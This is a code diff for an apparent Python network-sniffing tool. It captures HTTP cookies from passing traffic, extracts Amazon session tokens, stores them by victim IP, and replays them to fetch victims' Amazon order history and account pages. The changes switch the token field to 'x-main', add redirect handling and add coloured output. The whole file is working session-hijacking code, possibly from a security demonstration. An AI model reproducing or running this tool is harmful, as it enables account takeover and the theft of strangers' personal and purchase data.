@@ -18,9 +18,14 @@ from scapy.all import MTU
 ###########################################################################################################
                                     # Declare Global Variables #
 ###########################################################################################################
+# Add some colors to the terminal text
+BLUE = '\033[94m'
+YELLOW = '\033[93m'
+RED = '\033[91m'
+BOLD = '\033[1m'
 
 session_ids = set()  	# global set for all session ids
-user_packet ={} 		# # dict that contains the whole user packet
+user_packet = {} 		# # dict that contains the whole user packet
 user_complete = {}		# dict to track packet status if chunked
 user_start = {}			# dict to track user packet start
 cookie_dict = {} 		# dict to store the user cookies
@@ -39,7 +44,7 @@ def extract_amazon_stok(cookie):
 
     cookie_field = cookie.split(": ")[1]
     cookie_toks = {l.split('=',1)[0]:l.split('=',1)[1] for l in cookie_field.strip().replace(' ','').split(";")}
-    return cookie_toks['session-token']
+    return cookie_toks['x-main']
 
 ###########################################################################################################
                     # Function to Extract Session Token From Amazon Cookie String #
@@ -95,13 +100,11 @@ def extract_cookie(src_ip, src_port, payload):
                 if "cookie: "in field.lower(): # if cookie is found in the header
                     cookie_str = field
                     s_tok = extract_amazon_stok(field)
-                    # print "cookie found"
                     break
 
             if s_tok not in session_ids:
                 session_ids.update([s_tok])
                 temp_cookie = cookie_str.split(": ")[1]
-                # print temp_cookie
                 cookie_dict[src_ip] = temp_cookie
                 # Dictionary of source MAC and cookie --> later use
                 # cookie_mac_dict[mac] = temp_cookie
@@ -117,15 +120,24 @@ def extract_cookie(src_ip, src_port, payload):
 
 def make_request(user_ip, cookie):
 
-    global img_dict, email
+    global img_dict
     flag = 0
 
     url_history = "http://www.amazon.com/gp/history/"
     url_email = "http://www.amazon.com/gp/your-account/order-history/"
     add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
     add_headers["Cookie"] = cookie
-    r = requests.get(url_history, headers=add_headers)
-    r1 = requests.get(url_email, headers=add_headers)
+    response_history = requests.get(url_history)
+    # if get redirected --> get the final url
+    if response_history.history:
+        print RED + "Request was redirected"
+        print BOLD + BLUE + "Final URL: %s" % response_history.url
+    response_email = requests.get(url_email)
+    if response_email.history:
+        print RED + "Request was redirected"
+        print BOLD + BLUE + "Final URL: %s" % response_email.url
+    r = requests.get(response_history.url, headers=add_headers)
+    r1 = requests.get(response_email.url, headers=add_headers)
     resp = r.content
     resp1 = r1.content
     soup = BeautifulSoup(resp, 'html.parser')
@@ -313,7 +325,7 @@ def run_response_server(ip, port):
         """Handle requests in a separate thread."""
 
     server = ThreadedHTTPServer(('', port), Handler)
-    print 'Starting server, use <Ctrl-C> to stop'
+    print BOLD + YELLOW + 'Starting server, use <Ctrl-C> to stop'
     server.serve_forever()
 
 
@@ -380,7 +392,6 @@ def main():
     cookie_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2 ** 30)
     cookie_socket.bind((interface, ETH_P_ALL))
 
-    #run_response_server()
     #Run the response server in a parallel thread
     server_thread = threading.Thread(target=run_response_server, args=(ip, port))
     server_thread.daemon = True
